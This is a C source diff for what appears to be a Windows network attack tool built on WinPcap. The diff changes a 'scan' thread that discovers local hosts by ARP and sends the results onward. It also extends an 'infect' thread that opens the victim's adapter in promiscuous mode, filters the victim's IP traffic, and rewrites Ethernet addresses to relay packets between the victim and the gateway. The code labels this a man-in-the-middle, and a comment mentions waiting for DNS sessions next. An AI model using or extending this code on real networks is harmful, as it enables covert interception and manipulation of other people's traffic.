@@ -78,13 +78,11 @@ DWORD WINAPI scan(LPVOID lparam)
 {
 	//Winpcap
 	pcap_t* fp;
-	pcap_if_t* const alldevs, * temp;
-	struct pcap_addr* addr;
+	pcap_if_t* alldevs, * temp;
 	struct bpf_program fcode;
 	int res;
 	struct pcap_pkthdr* pkt_header;
 	const u_char* pkt_data = NULL;
-	ULONG32 netmask;
 	host* active_hosts;
 	//Windows
 	PIP_ADAPTER_INFO pAdapterInfo = NULL;
@@ -99,8 +97,10 @@ DWORD WINAPI scan(LPVOID lparam)
 	GetAdaptersInfo(pAdapterInfo, &outBufLen);
 	pcap_findalldevs(&alldevs, NULL);
 	
-	for (temp = alldevs; temp; temp = temp->next)
+	for (temp = alldevs; temp ; temp = temp->next)
 	{
+		if (!temp->addresses)
+			continue;
 		/*open the adapter*/
 		fp = pcap_open(
 			temp->name,
@@ -111,15 +111,8 @@ DWORD WINAPI scan(LPVOID lparam)
 			NULL
 		);
 
-		if (temp->addresses != NULL)
-			/* Retrieve the mask of the first address of the interface */
-			netmask = ((struct sockaddr_in*)(temp->addresses->netmask))->sin_addr.S_un.S_addr;
-		else
-			/* If the interface is without addresses we suppose to be in a C class network */
-			netmask = 0xffffff;
-
 		/*Filter arp packets only*/
-		if (pcap_compile(fp, &fcode, "arp", 1, netmask) < 0)
+		if (pcap_compile(fp, &fcode, "arp", 1, 0) < 0)
 		{
 			fprintf(stderr, "\nUnable to compile the packet filter. Check the syntax.\n");
 			/* Free the device list */
@@ -141,7 +134,7 @@ DWORD WINAPI scan(LPVOID lparam)
 		}
 
 		/*update globals for send_packet*/
-		send_packets_params.adapter = corresponding_adapter(alldevs, pAdapterInfo);
+		send_packets_params.adapter = corresponding_adapter(temp, pAdapterInfo);
 		send_packets_params.fp = fp;
 
 		/*start send_packet thread*/
@@ -180,13 +173,13 @@ DWORD WINAPI scan(LPVOID lparam)
 				counter++;
 				if (counter == MAX_HOSTS)
 				{
-					send_result(active_hosts, MAX_HOSTS * sizeof(host));
+					send_result((uint8_t*)active_hosts, MAX_HOSTS * sizeof(host));
 					memset(active_hosts, 0, sizeof(active_hosts));
 					counter = 0;	
 				}
 			}
 		}
-		send_result(active_hosts, MAX_HOSTS * sizeof(host));
+		send_result((uint8_t*)active_hosts, MAX_HOSTS * sizeof(host));
 		//close adapter
 		pcap_close(fp);
 	}
@@ -204,32 +197,51 @@ DWORD WINAPI infect(LPVOID lparam)
 	
 	PIP_ADAPTER_INFO pAdapterInfo = NULL;
 	ULONG outBufLen = 0;
-	GetAdaptersInfo(pAdapterInfo, &outBufLen);
-	pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
-	if (!pAdapterInfo)
-		return -1;
-	GetAdaptersInfo(pAdapterInfo, &outBufLen);
+	ULONG netmask, host;
 
 	pcap_t* fp;
 	pcap_if_t* alldevs = NULL, * adapter;
 	pcap_addr_t* addr;
+
+	char* filter; 
+	size_t filter_size;
+	char temp_filter[] = "ip host";
+	struct in_addr n_addr;
+	struct bpf_program fcode;
+	int res;
+	struct pcap_pkthdr* pkt_header;
+	const u_char* pkt_data = NULL;
+
 	
+	/* allocate heap memory */
+	n_addr.S_un.S_addr = htonl(infect_params.victim_ip);
+	filter_size = strlen(temp_filter) + strlen(inet_ntoa(n_addr)) + 2; // space and null terminator (2).
+	filter = (char*)malloc(filter_size);
+
+	GetAdaptersInfo(pAdapterInfo, &outBufLen);
+	pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
+
 	pcap_findalldevs(&alldevs, NULL);
-	
-	if (!alldevs)
+
+	/* check if allocation worked successfully */
+	if (!pAdapterInfo || !filter || !alldevs)
 		return -1;
+
+	GetAdaptersInfo(pAdapterInfo, &outBufLen);
 
 	for (adapter = alldevs; adapter; adapter = adapter->next)
 	{
 		int found = 0; //false
 		for (addr = adapter->addresses; addr; addr = addr->next)
 		{
-			ULONG netmask, host;
 			host = ((struct sockaddr_in*)(addr->addr))->sin_addr.s_addr;
 			netmask = ((struct sockaddr_in*)(addr->netmask))->sin_addr.s_addr;
 
 			if ((host & netmask) == (command->victim_ip & netmask))
+			{
 				found = 1; //true
+				break;
+			}
 		}
 		if (found)
 			break;
@@ -241,12 +253,28 @@ DWORD WINAPI infect(LPVOID lparam)
 	/*open the adapter*/
 	fp = pcap_open(
 		adapter->name,
-		sizeof(ether_hdr) + sizeof(arp_ether_ipv4),
+		65536,
 		PCAP_OPENFLAG_PROMISCUOUS,
-		5000,
+		1000,
 		NULL,
 		NULL
 	);
+
+	/* create filter */
+	snprintf(filter, filter_size, "%s %s\n", temp_filter, inet_ntoa(n_addr));
+	if (pcap_compile(fp, &fcode, filter, 1, netmask) < 0)
+	{
+		free(pAdapterInfo);
+		pcap_freealldevs(alldevs);
+		return -1;
+	}
+
+	if (pcap_setfilter(fp, &fcode) < 0)
+	{
+		free(pAdapterInfo);
+		pcap_freealldevs(alldevs);
+		return -1;
+	}
 
 	infect_params.fp = fp;
 	infect_params.adapter = corresponding_adapter(adapter, pAdapterInfo);
@@ -260,6 +288,32 @@ DWORD WINAPI infect(LPVOID lparam)
 		return -1;
 	}
 
+	while ((res = pcap_next_ex(fp, &pkt_header, &pkt_data)) >= 0)
+	{
+		/* Timeout elapsed */
+		if (res == 0)
+		{
+			if (WaitForSingleObject(hThread, 0) == WAIT_OBJECT_0)
+			{
+				CloseHandle(hThread);
+				break;
+			}
+			continue;
+		}
+
+		ether_hdr* eth_header;
+		eth_header = (ether_hdr*)pkt_data;
+
+		/* change packet src/dst (MITM) */
+		memcmp(eth_header->src_addr, infect_params.victim_mac, ETH_ALEN) == 0 // if src = taget
+			? memcpy(eth_header->dest_addr, infect_params.gateway_mac, ETH_ALEN) // (dst = gateway)
+			: memcpy(eth_header->dest_addr, infect_params.victim_mac, ETH_ALEN); // else (dst = victim) 
+		memcpy(eth_header->src_addr, infect_params.adapter->Address, ETH_ALEN); // src = this
+
+		/* foward packet */
+		pcap_sendpacket(fp, pkt_data, pkt_header->caplen);
+		
+	}
 	//deal with routing stuff (wait for DNS sessions)
 	
 	return 0;
